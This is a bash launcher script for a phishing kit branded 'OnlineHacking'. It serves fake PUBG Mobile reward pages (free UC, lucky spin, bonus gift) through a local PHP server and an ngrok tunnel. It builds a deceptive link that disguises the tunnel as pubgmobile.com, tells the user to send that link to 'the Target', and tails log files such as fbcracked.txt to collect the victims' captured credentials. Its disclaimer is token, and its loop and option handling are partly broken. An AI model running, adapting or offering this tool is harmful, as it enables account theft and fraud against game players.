#!/bin/bash
clear
echo ""
echo ""
printf "\e[100;330m[\e[10m **** ]\e[1;40m\e[10m OnlineHacking :\e[1;32m Join Telegram Channel @OnlineHacking  !\e[0m"
sleep 4
echo ""
clear
echo ""
echo ""
echo ""
echo 
echo -e "\e[31m[\e[32m★\e[31m]\e[32m This Tool is only educational purpose and we are not responsible for kind of illegal activity done by this tool\e[m "
sleep 2
echo ""
echo ""
echo -en "\e[31m[\e[32m*\e[31m]\e[32m Accepted This Notice (y/n)? \e[m "
read ans
if [ "$ans" != "${ans#[Yy]}" ]; then
echo ""
echo""
echo""
echo""

if [[ $option == *'N'* ]]; then
clear
exit
fi
if [[ $option == *'n'* ]]; then
clear
exit
fi

php="$(ps -efw | grep php | grep -v grep | awk '{print $2}')"
ngrok="$(ps -efw | grep ngrok | grep -v grep | awk '{print $2}')"
kill -9 $php
kill -9 $ngrok
clear
bash OnlineHacking/Logo.sh
cat OnlineHacking/Logo.txt | lolcat
echo ""
echo ""
 
                 echo -e $'\e[1;33m[\e[0m\e[1;33m *** \e[0m\e[1;96m]\e[0m\e[1;96m        ---------------      \e[1;33m  [ ]\e[0m'   
                 read -p $'\e[1;91m[\e[0m\e[1;91m *** \e[0m\e[1;96m]\e[0m\e[1;96m    What You Want to Choose  \e[1;91m  > > > > > \e[0m' option
                 echo ""
		 if [ $option = 01 ] || [ $option = 1 ]
                 then 
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd Free-UC-Buy-OH/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 25
                           clear
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
                           echo -e "\e[92m
SUMAN ©\e[34m
         ██████╗ ███╗   ██╗██╗     ██╗███╗   ██╗███████╗    
        ██╔═══██╗████╗  ██║██║     ██║████╗  ██║██╔════╝    
        ██║   ██║██╔██╗ ██║██║     ██║██╔██╗ ██║█████╗      
        ██║   ██║██║╚██╗██║██║     ██║██║╚██╗██║██╔══╝      
        ╚██████╔╝██║ ╚████║███████╗██║██║ ╚████║███████╗    
         ╚═════╝ ╚═╝  ╚═══╝╚══════╝╚═╝╚═╝  ╚═══╝╚══════╝    
                                                            
    ██╗  ██╗ █████╗  ██████╗██╗  ██╗██╗███╗   ██╗ ██████╗   
    ██║  ██║██╔══██╗██╔════╝██║ ██╔╝██║████╗  ██║██╔════╝   
    ███████║███████║██║     █████╔╝ ██║██╔██╗ ██║██║  ███╗  
    ██╔══██║██╔══██║██║     ██╔═██╗ ██║██║╚██╗██║██║   ██║  
    ██║  ██║██║  ██║╚██████╗██║  ██╗██║██║ ╚████║╚██████╔╝  
    ╚═╝  ╚═╝╚═╝  ╚═╝ ╚═════╝╚═╝  ╚═╝╚═╝╚═╝  ╚═══╝ ╚═════╝   
ONLINE HACKING			  
							  							  
          \e[m"
echo -e " \e[36mWebsite : \e[0m\e[92mwww.onlinehacking.xyz \e[0m\n"
  
echo -e " \e[31mGitHub : \e[0m\e[93mhttps://github.com/OnlineHacKing \e[0m\n"

echo -e " \e[97mTelegram : \e[0m\e[34mhttps://telegram.dog/OnlineHacKing \e[0m\n"
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo ""
			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
                           echo ""
                           echo "" 
                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                           echo ""
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.pubgmobile.com-@$link                                    
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           else
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           fi
                           
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f log.txt 

                
	          break;
                  elif [ $option = 02 ] || [ $option = 2 ]
	          then
	                   cd /data/data/com.termux/files/usr/bin/phs
                           cd Lucky-Spin-OH/       
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 25
                           clear
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
                           cat OnlineHacking/secnhack
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo ""
			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
                           echo ""
                           echo "" 
                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                           echo ""
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.pubgmobile.com-@$link                                    
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           else
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           fi
                           
                           if [[ -e log.txt ]]; then
                           > log.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f log.txt 


                  break;
                  elif [ $option = 03 ] || [ $option = 3 ]
	          then
                           cd /data/data/com.termux/files/usr/bin/phs
                           cd BonusChallenge-Free-Gift-OH/
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !   PHP SERVER NOW STARTING   !      \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           php -S 127.0.0.1:4444 > /dev/null 2>&1 &
                           sleep 3
                           echo ""
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;91m     !  NGROK SERVER NOW STARTING  !     \e[0m'
                           echo -e $'\e[1;33m\e[0m\e[1;77m \e[0m\e[1;33m\e[0m\e[1;36m       ---------------------------        \e[0m'
                           ./ngrok http 4444 > /dev/null 2>&1 &
                           sleep 25
                           clear
                           echo ""
                           link=$(curl -s -N http://127.0.0.1:4040/api/tunnels | grep -o "[0-9a-z]*\.ngrok.io")
                           echo ""
                           echo ""
                           cat OnlineHacking/secnhack
                           echo -e "\e[96m========================\e[92m VICTIM INFORMATION \e[96m========================= \e[93m"  
			   echo ""
			   echo -e "\e[96m========================\e[92m    SUMAN © 2021    \e[96m=========================\e[92m"
                           echo ""
                           echo "" 
                           read -p $'\e[1;40m\e[96m DO YOU WANT TO MODIFY URL ?\e[1;91m (Y/N) : \e[0m' option
                           echo ""
                           if [[ $option == *'Y'* ]] || [[ $option == *'y'* ]] 
                           then
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://www.pubgmobile.com-@$link                                    
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           else
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > >\e[0m'
                           printf "\e[1;33m\e[0m\e[1;33m Send this link to the Target :\e[0m\e[1;77m %s\e[0m\n" https://$link
                           echo -e $'\e[1;33m\e[0m\e[1;77m\e[0m\e[1;33m\e[0m\e[1;96m ------------------------- > > > > > > >\e[0m'
                           fi
                           
                           if [[ -e fbcracked.txt ]]; then
                           > fbcracked.txt
                           fi 
                           echo ""
                           echo ""
                           tail -f fbcracked.txt
 
                  
                 break;
                 
                elif [ $option = 99 ]
	        then     
	                 echo
       	                 exit 
		break;
		      
                else 
		  
		         echo
		         echo -e "\e[92m[\e[94m!\e[92m]\e[92m Invalid option Try Again !! \e[m "
		         sleep 2
                         exit
		         fi
                         done
